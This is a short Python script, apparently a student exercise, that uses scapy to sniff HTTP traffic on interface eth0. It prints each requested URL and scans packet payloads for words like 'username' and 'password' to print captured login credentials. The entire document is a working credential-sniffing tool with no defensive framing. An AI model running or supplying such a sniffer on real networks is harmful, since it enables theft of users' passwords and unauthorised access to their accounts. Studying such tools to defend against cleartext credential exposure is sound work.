#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http 

def sniff(interface):
    scapy.sniff(iface= interface , store=False,  prn=process_sniffed_packet)
def get_ulr(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ['user' , 'username' ,  'uname' , ' password' ,  'pass' , 'login']
            for keyword in keywords:
                if keyword in str(load):
                    return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url = get_ulr(packet)
        print("HTTP Request >>" + url.decode())#same as str 
        login_info = get_login_info(packet)
        if login_info:
            print("\n\nPosible username/password >> " + str(login_info) + "\n\n")
                


sniff("eth0")